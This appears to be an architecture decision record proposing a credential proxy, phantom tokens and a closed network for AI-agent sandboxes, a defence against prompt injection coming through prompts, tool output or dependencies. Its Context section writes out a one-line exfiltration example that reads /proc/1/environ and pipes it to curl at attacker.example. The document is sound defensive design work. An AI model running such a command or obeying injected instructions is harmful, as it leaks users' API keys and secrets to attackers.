# ADR-013: Sandbox Egress Credential Proxy

**Status:** Proposed
**Date:** 2026-05-14
**Author:** David Viejo

## Context

Workspace sandboxes (`crates/temps-workspace`, container provisioning in `crates/temps-agents/src/sandbox/docker.rs`) run agent code that we deliberately give broad latitude to: it edits the project tree, runs arbitrary build tools, and drives an AI CLI on behalf of the user. The threat model is not "the user is malicious" — it's "the user pasted a prompt, MCP tool output, or upstream dependency that contains an injection payload, and the agent now executes attacker-controlled instructions inside the container."

Two facts of the current design make that threat model uncomfortable:

1. **Plaintext credential injection.** `message_executor.rs` resolves AI credentials, deployment tokens, and linked-service connection strings (`ANTHROPIC_API_KEY`, `OPENAI_API_KEY`, `TEMPS_API_TOKEN`, `DATABASE_URL`, `REDIS_URL`, …) and passes them to `docker create` as plaintext env vars (`message_executor.rs:1476–1633`). Any process the agent spawns inherits them, and any process can read them via `/proc/<pid>/environ`. An injected `cat /proc/1/environ | curl attacker.example` exfiltrates everything in one line.
2. **Unrestricted egress.** `temps-sandbox-net` is created with `internal: false` (`docker.rs:1000`). The container can DNS-resolve and TCP-connect to anywhere on the public internet. There is no allowlist, no proxy, no DNS scoping. A leaked credential is immediately usable from inside the container *or* from anywhere the attacker can ship the bytes to.

These two facts compound. Closing one without the other has limited value: a credential proxy with open egress lets the attacker bypass the proxy by calling Anthropic/OpenAI directly from inside the box; an egress allowlist with plaintext credentials means whoever owns the allowed destinations can be impersonated by anyone who reads the env file.

The git-credential daemon (`git_credential_service.rs`, daemon at uid 1001 with a 0600 env file the agent uid cannot read, single-repo single-permission tokens minted per request) already proves this pattern works inside Temps. We want to generalize it to the rest of the credential surface and pair it with a closed network.

The architectural inspiration is NanoClaw's "phantom token" + container-mount-as-authorization model — the agent literally cannot leak the real key because it never has it.

## Decision

Introduce a host-side **credential proxy** as the *only* outbound network path for workspace sandboxes. The sandbox bridge becomes `internal: true`, and a single proxy endpoint reachable on a sandbox-internal address is added to every container. Plaintext credentials never enter the container; placeholders do.

### 1. Network topology

- `temps-sandbox-net` is recreated with `internal: true`. Containers cannot reach the public internet directly.
- A new host-side service, **`temps-sandbox-proxy`** (new crate `temps-sandbox-proxy`, plugin-registered, listening on a dedicated address), is attached to `temps-sandbox-net` as the only egress hop.
- Each sandbox container is created with `HTTPS_PROXY=http://temps-sandbox-proxy:8443`, `HTTP_PROXY=http://temps-sandbox-proxy:8080`, and `NO_PROXY=temps-sandbox-*,localhost,127.0.0.1` so intra-sandbox traffic (preview gateway, sibling containers) bypasses the proxy.
- The proxy is the **only** container on `temps-sandbox-net` with a second NIC on a non-internal network. It is the egress chokepoint, full stop.

### 2. Phantom credentials

For every credential class the agent needs upstream access to, the container receives a placeholder of the form `temps-<sid>-<class>-<random>` instead of the real value. The proxy resolves the placeholder to the real credential at egress time, against an in-memory map keyed by `(session_id, credential_class)`.

Concretely, the following move from plaintext env to phantom values:

| Variable                  | Today                                  | After                                                |
|---------------------------|----------------------------------------|------------------------------------------------------|
| `ANTHROPIC_API_KEY`       | real `sk-ant-…`                        | `temps-<sid>-anthropic-<rand>`                       |
| `OPENAI_API_KEY`          | real `sk-…`                            | `temps-<sid>-openai-<rand>`                          |
| `TEMPS_API_TOKEN`         | real session token                     | `temps-<sid>-controlplane-<rand>`                    |
| GitHub PATs (when used)   | real `ghp_…` / `gho_…`                 | `temps-<sid>-github-<rand>`                          |
| `DATABASE_URL`, `REDIS_URL` and other linked-service connection strings | real DSNs containing passwords | DSN with `password=temps-<sid>-svc<n>-<rand>`; proxy substitutes on connect |

Linked-service DSNs are the awkward case because the proxy must understand wire protocols (PG, Redis, Mongo). Phase 1 covers HTTPS-only credentials (Anthropic, OpenAI, GitHub, control-plane). Linked-service DSNs stay plaintext until Phase 2 ships protocol-aware proxying or per-DSN ephemeral users (preferred — see "Not solved by this ADR").

### 3. Proxy responsibilities

`temps-sandbox-proxy` is an Axum + `hyper` HTTPS forward proxy that:

1. **Validates the placeholder.** On `CONNECT api.anthropic.com:443`, it inspects the per-connection auth header (`Proxy-Authorization: Bearer temps-<sid>-…`) and looks up `(session_id, anthropic)` in its in-memory map. Unknown placeholder → 407, logged with session id.
2. **Enforces per-class destination allowlists.** The `anthropic` class may only egress to `api.anthropic.com:443`. The `openai` class to `api.openai.com:443`. The `github` class to `api.github.com:443`, `*.githubusercontent.com:443`, and the user's configured Git host(s). Cross-class egress is rejected with 403.
3. **TLS-terminates only when it must rewrite.** For Anthropic/OpenAI/GitHub the proxy needs to rewrite the `Authorization` header — so it terminates TLS using a per-session ephemeral CA whose cert is installed in the container's trust store at provisioning time. For pass-through destinations on the package-manager allowlist (npm, PyPI, crates.io, deb mirrors, the AI provider's image CDNs), it acts as a CONNECT tunnel and does **not** terminate TLS.
4. **Rate-limits per session and per class.** Cap egress request rate and bytes-out per `(session_id, class)`. Default ceilings are configurable; exceeding them returns 429 to the sandbox and emits a structured log event the UI can surface ("Anthropic rate cap hit").
5. **Logs every egress.** Structured JSONL: `session_id`, `class`, `host`, `bytes_in`, `bytes_out`, `status`, `duration_ms`. This is the audit trail for "did the agent talk to anywhere it shouldn't have?" — and it costs nothing extra now that all egress flows through one process.

### 4. Provisioning hand-off

On sandbox creation (`docker.rs` container builder):

1. Before `docker create`, the workspace service calls `sandbox_proxy.issue_credentials(session_id, requested_classes)` and gets back a `Vec<(class, placeholder)>`.
2. The container is created with the placeholders as env values and the proxy CA as a mounted file (`/etc/ssl/certs/temps-sandbox-proxy.pem`, RO, baked into the image trust store via `update-ca-certificates` at build time so we don't need a runtime mutation).
3. On sandbox teardown (every exit path: graceful stop, crash, idle timeout, manual destroy), the workspace service calls `sandbox_proxy.revoke_session(session_id)`. The proxy drops the entire `(session_id, *)` keyspace. Placeholders become permanently invalid; any in-flight request using them gets 407 mid-stream.

Revocation is the load-bearing safety property. The credential map is in-memory, keyed by session id, and explicitly torn down. There is no on-disk credential store the proxy reads from, and no daemon-state file that could survive a session.

### 5. Failure modes are explicit

- **Proxy down.** Sandboxes cannot reach upstream APIs. The agent CLI gets connection-refused. We surface a structured banner in the workspace UI ("Sandbox egress proxy unavailable") and a corresponding HTTP 503 from the workspace API. We do not fall back to direct egress — fail closed is the entire point.
- **Placeholder leaked off-host.** The placeholder is useless: it only resolves inside the proxy's memory, which only listens on `temps-sandbox-net`. An attacker who exfiltrates `temps-<sid>-anthropic-<rand>` and tries it from their laptop hits nothing.
- **Placeholder used by sibling sandbox.** Each placeholder is bound to the originating session id. The proxy verifies the source IP belongs to that session's container (Docker assigns it; we record it at creation time). Cross-session reuse → 403, logged.
- **Real key needed by tooling that doesn't honor `HTTPS_PROXY`.** Some CLIs ignore env-based proxies. We patch the few we ship (Claude CLI, Codex, OpenCode) to honor it, and document the rest as unsupported. This is acceptable because we control the image.

## Consequences

### Positive

- A leaked env var inside the sandbox is no longer a leaked credential. The blast radius of prompt injection drops from "exfiltrate every linked secret" to "exfiltrate placeholders that only work inside a network the attacker doesn't sit on."
- Egress is auditable for the first time. One process, one log, one place to look when investigating.
- Per-class destination allowlists make "the agent uploaded the repo to pastebin" structurally impossible, not just policy-prohibited.
- Generalizes a pattern we already trust (the git credential daemon at uid 1001) to the rest of the credential surface.
- Rate limiting per class becomes free, which incidentally caps the cost of a runaway agent.

### Negative

- Adds a new always-on service (`temps-sandbox-proxy`) on the critical path of every sandbox API call. If it crashes, no sandbox can talk to Anthropic. It needs the same supervision and health-check surface as the rest of the control plane.
- Per-session ephemeral CAs add complexity to the sandbox image build. We need a provisioning step that installs the CA into the system trust store, and we need to rotate it (it should not be the same cert across sessions or restarts).
- `HTTPS_PROXY` does not cover non-HTTP egress (raw TCP, UDP, DNS-over-HTTPS to attacker-controlled resolvers). The `internal: true` bridge is what catches those. If we ever loosen the bridge, that protection collapses.
- Linked-service DSNs (`DATABASE_URL`, `REDIS_URL`) remain plaintext in Phase 1. Mitigated by Postgres/Redis being on internal-only networks already, but the plaintext-in-env problem persists for them until Phase 2.
- Per-class destination allowlists need maintenance as upstream APIs change endpoints (Anthropic adding a new region, GitHub splitting `api.github.com` for enterprise customers, etc.). We accept this as a known maintenance burden — the alternative is back to wide-open egress.

### Not solved by this ADR

- **Linked-service credentials.** Phase 2 should replace static `DATABASE_URL`-style DSNs with per-session ephemeral DB users (Postgres `CREATE ROLE … VALID UNTIL`, revoked on session teardown), which is a strictly better model than protocol-aware proxying. Tracked separately.
- **Tamper-proof mount blocklist.** Complementary hardening (forbidden host paths in an external policy file). Out of scope here; will be a separate ADR if we adopt it.
- **Splitting the sandbox uid.** Generalizing the git-daemon split-uid pattern to other secret-holding processes is a separate decision. The phantom-token model in this ADR substantially reduces (but does not eliminate) the value of that change for HTTPS credentials, since there is no real secret left in the agent uid's address space to protect.
- **Egress to user-configured destinations.** Self-hosted customers will want to add their own allowlist entries (private artifact registries, internal git hosts). The mechanism for that — config file vs. UI vs. per-project — is deferred until Phase 1 ships and we see which surfaces real friction.

## Implementation

Phased, behind a feature flag (`TEMPS_SANDBOX_PROXY_ENABLED`) so we can ship the proxy crate, dogfood it on staging, and flip the bridge to `internal: true` only when we're confident.

**Phase 1 — Proxy + HTTPS credentials.**
- New crate `temps-sandbox-proxy` (Axum + `hyper`), plugin-registered. Owns the per-session credential map, the destination allowlist tables, the per-session CA, and the egress log writer.
- New service method on `WorkspaceService`: `provision_sandbox_credentials(session_id, classes) → Vec<(class, placeholder)>`. Called by `message_executor.rs` immediately before `docker create`.
- New service method on `WorkspaceService`: `revoke_sandbox_credentials(session_id)`. Called from every sandbox teardown path — there are several; audit them all.
- Sandbox image (`Dockerfile` for the workspace base image) gains the proxy CA install step.
- `docker.rs` container builder: add `HTTPS_PROXY` / `HTTP_PROXY` / `NO_PROXY` env vars; add CA bundle as RO bind mount; flip `temps-sandbox-net` to `internal: true` only when the feature flag is on.
- Tests:
    - `temps-sandbox-proxy`: unit tests for placeholder validation, allowlist enforcement (allowed → 200, off-allowlist → 403, unknown placeholder → 407), session-bound source-IP check, revocation invalidates in-flight tokens.
    - `temps-workspace`: integration test that creates a sandbox with the flag on, asserts the env vars contain placeholders not real keys, asserts a curl from inside the container to a non-allowlisted host fails, asserts the Anthropic CLI succeeds.
    - Egress log: structured JSONL fields are present and stable (this is a contract for downstream alerting).

**Phase 2 — Linked-service credentials (separate ADR).**

**Rollout.** Feature flag default off. Enable on staging + a single dogfood project. Monitor the egress log for false positives (legitimate destinations we forgot to allowlist). Flip on by default once the allowlist stabilizes for a full week.

## References

- ADR-009 — Sandbox API versioning. Same `/v1/sandbox/*` surface; the proxy is invisible to it.
- `crates/temps-workspace/src/services/git_credential_service.rs` — existing split-uid credential daemon, the pattern this ADR generalizes.
- `crates/temps-agents/src/sandbox/docker.rs:980–1012` — current network creation (`internal: false`), to be flipped behind the flag.
- `crates/temps-workspace/src/services/message_executor.rs:1476–1633` — current plaintext credential injection sites; all of them gain a placeholder hop.
- NanoClaw architecture writeup — https://jonno.nz/posts/nanoclaw-architecture-masterclass-in-doing-less/ — origin of the phantom-token pattern.
- RFC 7235 — HTTP/1.1 Authentication (the `Proxy-Authorization` header semantics the proxy relies on).
